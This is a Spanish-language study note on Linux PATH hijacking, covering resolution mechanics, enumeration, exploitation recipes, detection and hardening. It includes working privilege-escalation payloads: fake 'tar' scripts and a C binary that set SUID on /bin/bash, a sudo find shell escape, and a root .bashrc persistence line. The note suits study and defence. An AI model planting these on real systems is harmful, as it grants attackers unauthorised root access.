---
tags:
  - ciberseguridad
  - escalada
  - path-hijacking
tipo: concepto
estado: terminado
---

# PATH Hijacking

**PATH Hijacking** (secuestro de `PATH`) es la técnica de **resolver un comando legítimo hacia un archivo controlado por el atacante**, aprovechando que la búsqueda de binarios sin ruta absoluta recorre la variable `PATH` **de izquierda a derecha** y se detiene en el primer acierto. Si un proceso privilegiado ejecuta `tar` en vez de `/bin/tar` y existe un `tar` escribible en un directorio antes que `/bin`, root ejecuta **tu** código.

> [!info] La variable `PATH`
> `PATH` es una lista de directorios separados por dos puntos (`:`) que el shell y `execvp()` usan para localizar ejecutables cuando el nombre **no contiene `/`**. Ejemplo: `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` → `ls` se resuelve probando `/usr/local/sbin/ls`, luego `/usr/local/bin/ls`… hasta el primer match. El shell mantiene además una **hash table** (`hash`, `type -a`) de aciertos previos.

## Mecánica: cómo se resuelve realmente un comando

Orden de resolución en un shell interactivo (bash/zsh):

| Paso | Se busca… | ¿Secuestrable? |
|---|---|---|
| 1 | **Builtins** (`cd`, `export`, `echo` en bash…, `pwd`) | No — no hay archivo que buscar |
| 2 | **Funciones del shell** definidas | Sí, si puedes inyectar funciones (`BASH_FUNC_*` exportadas — otra técnica) |
| 3 | **Hash table** del shell (aciertos previos) | `hash -r` la invalida tras cambiar PATH |
| 4 | **`PATH`**, directorio por directorio, primer acierto | **Sí — el vector principal** |

Detalles que deciden el ataque:

- **`execvp()` no distingue tipos**: basta que el primer archivo encontrado sea *ejecutable*; no tiene que ser un ELF — un `#!/bin/sh` con `chmod +x` funciona. El kernel luego interpreta la shebang.
- **Elemento vacío en PATH = directorio actual**: `PATH=/usr/bin::/bin` o `PATH=.:$PATH` meten el *cwd* del proceso a la búsqueda. **Este es el trampa clásica** (*current-dir-in-PATH trap*): root ejecuta un binario desde un directorio escribible y su `PATH` contiene `.` o `''`.
- **Rutas relativas en PATH** (ej. `bin`) se resuelven contra el *cwd* del proceso, no tuyo.
- **Builtins ganan siempre**: no puedes secuestrar `cd` o `export` creando un archivo llamado `cd` — por eso los guiones usan `command cd`/rutas absolutas.
- El *cwd* y el PATH **tuyos** solo afectan a **procesos que tú arrancas** (y a los que hereden tu entorno). Para escalar hay que encontrar un proceso **ajeno** (cron, systemd, sudo, SUID) cuyo PATH/cwd sea manipulable o ya defectuoso.

### De dónde viene el PATH de un proceso

| Fuente | Quién lo define | Relevancia ofensiva |
|---|---|---|
| `/etc/environment` (leído por `pam_env`) | admin | si escribe un no-root → **todos los logins** |
| `/etc/profile`, `~/.bashrc`, `~/.profile` | admin / usuario | redirección de PATH al login de una cuenta privilegiada |
| `sudo` (`secure_path`, `env_reset` en sudoers) | sudoers | sin `secure_path`, `sudo` hereda tu PATH (ver [[Abuso de Privilegios Sudoers]]) |
| `cron` | crond pone PATH por defecto (`/usr/bin:/bin`…), el job puede sobreescribirlo | relativo + dir escribible = root (ver Cron note) |
| systemd (`Environment=`, `EnvironmentFile=`) | unit file | si el unit o el envfile son escribibles |
| Herencia de padre (`systemd --user`, SSHD) | entorno | inyectar en el entorno de sesión |
| Script que olvidó fijar PATH | — | el script de root usa **tu** PATH si fuiste invocado por él |

## Enumeración: localizar el vector

```bash
# 1) Tu PATH y quién lo define
echo "$PATH"; type -a ls curl python3       # ¿qué se ejecutará y dónde
env | grep -E '^(PATH|LD_)='
cat /etc/environment /etc/profile /etc/bash.bashrc 2>/dev/null | grep PATH

# 2) ¿Hay directorios escribibles en algún PATH (tuyo o de servicios)?
for d in ${PATH//:/ }; do [ -w "$d" ] && echo "WRITABLE: $d"; done
# para PATH de proceso ajeno:
tr '\0' '\n' < /proc/<pid>/environ | grep '^PATH='
# y comprobar cada entrada de ese PATH con test -w

# 3) PATH defectuosos: ¿contiene '.', '' (vacío), $HOME, /tmp, dirs de usuario?
ps eww -p <pid>                # entorno completo de un proceso root
grep -RIn 'PATH=.*\.' /etc/cron* /etc/systemd/system 2>/dev/null
grep -RInE 'PATH=|Environment=' /etc/systemd/system /lib/systemd/system 2>/dev/null

# 4) ¿Comandos con ruta RELATIVA en scripts que corren como root?
grep -RInvE '^[[:space:]]*(#|$)' /etc/cron* 2>/dev/null | grep -vE '/[a-z]'
#   cualquier campo de comando sin '/' es sospechoso:  0 * * * * backup.sh
grep -RInE '^\s*(tar|cp|rsync|zip|awk|sed|curl|wget|python) ' /etc/cron* /opt 2>/dev/null

# 5) Directorios escribibles globalmente (candidatos a "primer PATH")
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|tmp)' | head
find / -perm -0002 -type d ! -path '/proc/*' 2>/dev/null | head   # world-writable
```

> [!tip] Triage rápido
> Los dos patrones que siempre revisar: **(a)** algún dir escribible presente en el `PATH` de un proceso privilegiado, **(b)** algún comando **relativo** dentro de un job cron/unit/root-script. Sin (a) ni (b), no hay PATH hijacking — pasar a [[Privilegios SUID en Linux]] o [[Detección y Explotación de Tareas Cron]].

## Explotación: recetas

### 1) Binario malicioso de una línea (la receta base)

```bash
# Directorio escribible en el PATH del proceso víctima, p. ej. /usr/local/bin
cat > /usr/local/bin/tar <<'EOF'
#!/bin/sh
chmod u+s /bin/bash        # o: cp /bin/bash /tmp/pwn && chmod 4755 /tmp/pwn
EOF
chmod +x /usr/local/bin/tar
# El próximo "tar ..." lanzado por root ejecuta este guion con euid=0
```

Variantes del payload (elige según lo que haga el comando original, para que no falle):

```bash
printf '#!/bin/sh\ncp /bin/bash /tmp/pwn && chmod 4755 /tmp/pwn\n' > ./evil
printf '#!/bin/sh\nid > /tmp/pwned\n' > ./ls                      # solo evidencia
# Script que "hace su trabajo" además de escalar (stealth en labs):
echo '#!/bin/sh\n/usr/bin/tar.real "$@"\nchmod u+s /bin/bash' > tar
```

### 2) Binario ELF propio (si el binario malicioso debe ser ELF)

```bash
cat > evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("chmod u+s /bin/bash"); return 0; }
EOF
gcc -o tar evil.c          # colocar en el dir PATH prioritario y +x
```

### 3) Cron con comando relativo (escenario más frecuente en labs)

```crontab
# entrada de root en /etc/crontab (formato con campo PATH? no — pero el comando es relativo):
*/5 * * * * root backup.sh
#  ataques posibles:
#  a) backup.sh se resuelve en PATH → plantar tu backup.sh en el primer dir PATH escribible
#  b) backup.sh vive en un dir escribible → editarla directamente
#  c) backup.sh llama "tar", "zip", "awk" sin ruta → plantar esos nombres
```

Ver el detalle completo (cwd de cron, `/usr/bin/crontab` vs `/etc/crontab`, `.d/`) en [[Detección y Explotación de Tareas Cron]].

### 4) Servicio systemd que usa binarios relativos o `EnvironmentFile` escribible

```bash
systemctl show <svc> -p Environment,WorkingDirectory,ExecStart
# si el unit o EnvironmentFile=/etc/default/svc son escribibles:
echo 'PATH=/tmp/evil:/usr/bin:/bin' >> /etc/default/svc   # reinicio → root
systemctl restart <svc>
```

### 5) sudo sin `secure_path`

```bash
# sudoers: Defaults env_reset pero SIN secure_path, o Defaults !env_reset
sudo PATH=/tmp:$PATH find /tmp -name x -exec /bin/sh \;   # find ejecuta TU PATH
# sudo que permite -E y scripts que llaman comandos relativos → hijack
```

(Ver [[Abuso de Privilegios Sudoers]] para la superficie completa.)

### 6) La trampa del directorio actual

```bash
# PATH roto de root:
echo $PATH
#  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:.     ← '.' al final
#  o:  PATH=/usr/bin::/bin  →  elemento vacío = cwd
# Root hace: cd /var/tmp && somecommand
# Atacante, en el mismo cwd:
echo '#!/bin/sh\nchmod u+s /bin/bash' > somecommand && chmod +x somecommand
```

> [!warning] SUID + PATH relativo = root instantáneo
> Un binario SUID que a su vez ejecuta comandos relativos (o que puedes hacer *tuyo* el cwd) **no** hereda tu PATH por seguridad — el kernel usa el entorno que le pases, pero binarios SUID saneados llaman a `/bin/ls` absoluto o ignoran PATH sospechoso. Los casos explotables son los SUID con `system("comando")` sin ruta: ahí el PATH **sí** se respeta y se documenta en [[Privilegios SUID en Linux]] (GTFOBins).

### 7) Persistencia: PATH en el perfil

```bash
# Si puedes escribir en ~/.bashrc de una cuenta que use root/sudo frecuentemente:
echo 'PATH=/home/attacker/bin:$PATH' >> /root/.bashrc     # requiere escritura previa
# o en /etc/profile.d/… si el directorio es escribible
```

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Ejecución desde dir escribible | `auditctl -a always,exit -F arch=b64 -S execve -F dir=/usr/local/bin -k path_exec` (o FIM/EDR sobre el dir) |
| PATH inesperado en proceso | monitorear `process_start` con `PATH` que contiene `.`, `/tmp`, `$HOME` o dirs no estándar (osquery `process_events`) |
| Nuevo archivo ejecutable en dirs de PATH | FIM (AIDE/Tripwire) sobre `/usr/local/bin`, `/usr/bin`; `find /usr/local/bin -newer /etc/hostname` |
| Cron con comando relativo | revisión estática de `/etc/cron*`, `system.timer` y unidades con `Environment=` |
| Cambio de `/etc/environment`, `profile.d` | FIM; `grep PATH /etc/environment` en baseline |
| Redirección de `ls`/`tar`/`curl` | `type -a` en auditorías; hash table de shells de root (`history` no basta) |

Artefactos del ataque: archivos ejecutables recién creados en directorios de PATH, hechos `+x` por usuarios no-admin; guiones one-liner con `chmod u+s`/`id >`; entradas de cron/units modificadas; `PATH` con `.` o `/tmp` en `/proc/pid/environ` de procesos de root.

## Impacto

- **Root directo**: comando relativo ejecutado por cron/systemd/sudo con dir escribible en su PATH → payload `chmod u+s /bin/bash` o escritura en `/etc/cron.d`.
- **Robo de datos/credenciales**: payload que copia `~/.ssh`, `id_rsa`, tokens antes de delegar al binario real.
- **Movimiento lateral**: secuestro de `curl`/`wget`/`scp` para desviar descargas o exfiltración.
- **Evasión**: binario original ejecutado "normalmente" (payload encadena el real) — el servicio sigue funcionando y la anomalía tarda en aparecer.

## Sección defensiva: endurecimiento

```bash
# 1) Rutas absolutas en TODOS los scripts y units (regla #1)
tar -czf /backup/x.tgz /var/www        # NO: tar -czf x.tgz var/www con cd
#  en units: ExecStart=/usr/bin/app --flag  (nunca ExecStart=app)

# 2) Fijar PATH al inicio de cada script (patrón de /etc/crontab)
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH

# 3) sudo: env_reset + secure_path (lo trae Ubuntu/Debian por defecto — verificarlo)
sudo visudo -c | grep -E 'secure_path|env_reset'
#  Defaults env_reset
#  Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# 4) Quitar la trampa del cwd: prohibir '.' y elementos vacíos en PATH global
grep -n 'PATH' /etc/environment /etc/profile /etc/profile.d/* 2>/dev/null

# 5) Permisos: nadie que no sea root escribe en directorios de PATH
ls -ld /usr/local/bin /usr/local/sbin
#  corregir: chown root:root /usr/local/bin && chmod 755 /usr/local/bin

# 6) Limpiar rastros de "PATH manuales" en unidades
grep -RInE '^\s*Environment=.*PATH' /etc/systemd/system /lib/systemd/system
#  todo PATH no estándar → justificar o eliminar

# 7) Detección continua
auditctl -a always,exit -F arch=b64 -S execve -F dir=/usr/local/bin -k path_exec
# + FIM sobre /etc/environment, profile.d, cron.d
```

> [!tip] Higiene de guiones
> Un script que no fija su PATH **hereda el PATH de quien lo llamó**. Si root llama `./mi_script.sh` desde un entorno contaminado, el script contaminado corre. `PATH=…` fijado *dentro* del script (primeras líneas) lo hace inmune — ver [[Bash Scripting - Fundamentos Básicos]].

## Errores comunes

1. **"Cambié mi PATH y ahora soy root"** — cambiar `PATH` propio solo afecta a **tus** procesos. El vector real requiere un proceso **privilegiado ajeno** con PATH/cwd manipulable o roto.
2. **Esperar secuestrar builtins** (`cd`, `export`, `source`) — el shell los resuelve antes que `PATH`; no tienen archivo que secuestrar.
3. **Olvidar `hash -r`** — tras cambiar PATH, el shell sigue ejecutando la copia cacheada y "el ataque no funciona" (falso negativo en pruebas propias).
4. **Plantar en el cwd equivocado** — el cwd relevante es el del **proceso víctima**, no el tuyo. Verificar con `ls -l /proc/<pid>/cwd`.
5. **Cron no usa tu PATH** — crond pone `PATH=/usr/bin:/bin` (o la del crontab); `echo $PATH` de tu sesión es irrelevante para jobs de root.
6. **Falso positivo: `find / -writable` sobre `/tmp`, `/dev/shm`** — no están en PATH normalmente; solo cuentan dirs **en el PATH del proceso víctima**.
7. **Asumir que world-writable = explotable** — el dir debe estar *antes* que el binario legítimo en la búsqueda (orden del PATH manda).
8. **Scripts con shebang `#!/usr/bin/env python3`** — `env` **también** busca por PATH: secuestrable en el mismo escenario (añadir `python3` malicioso al dir prioritario).
9. **No verificar ejecutabilidad** — un archivo sin `+x` es ignorado por la búsqueda; `chmod +x` es parte obligatoria de la receta.

## Cheatsheet

```bash
# Enumeración
echo "$PATH"; type -a <cmd>
for d in ${PATH//:/ }; do [ -w "$d" ] && echo WRITABLE $d; done
tr '\0' '\n' < /proc/<pid>/environ | grep '^PATH='
grep -RInE '^\s*(tar|cp|curl|python|awk) ' /etc/cron* 2>/dev/null   # comandos relativos
ps eww -p <pid>                                                     # PATH de proceso root

# Ataque (sobre dir escribible en PATH de la víctima)
printf '#!/bin/sh\nchmod u+s /bin/bash\n' > /usr/local/bin/tar && chmod +x /usr/local/bin/tar
echo '#!/bin/sh\nid > /tmp/pwned\n' > ls && chmod +x ls   # cwd con '.' en PATH
hash -r                                                     # invalidar caché al probar

# Defensa
# scripts: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# sudo: Defaults env_reset + Defaults secure_path="…"
auditctl -a always,exit -F arch=b64 -S execve -F dir=/usr/local/bin -k path_exec
ls -ld /usr/local/bin /usr/local/sbin      # 755 root:root, nunca 777 ni group-writable
```

## Referencias

- HackTricks — PATH hijacking / privilege escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- PayloadsAllTheThings — hijacking PATH: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation
- `env(1)` / `execvp` semantics — POSIX: https://man7.org/linux/man-pages/man3/execvp.3.html
- GTFOBins (binarios que ejecutan comandos — combinables con PATH): https://gtfobins.github.io/
- Notas internas: [[Detección y Explotación de Tareas Cron]], [[Abuso de Privilegios Sudoers]], [[Bash Scripting - Fundamentos Básicos]]

## Relacionadas

- [[Detección y Explotación de Tareas Cron]] — el escenario #1 de comandos relativos ejecutados por root
- [[Abuso de Privilegios Sudoers]] — `secure_path`/`env_reset` y cuándo `sudo` hereda tu PATH
- [[Privilegios SUID en Linux]] — binarios SUID que llaman comandos relativos
- [[Explotación de Servicios Internos]] — servicios con `EnvironmentFile` o working dir escribible
- [[Estructura de Directorios de Linux]] — qué debería y qué no debería estar en cada directorio del PATH
- [[Comandos Básicos de Sistema y Red en Linux]] — `env`, `type`, `which` y lectura de entorno
- [[Bash Scripting - Fundamentos Básicos]] — fijar `PATH` en guiones como higiene base
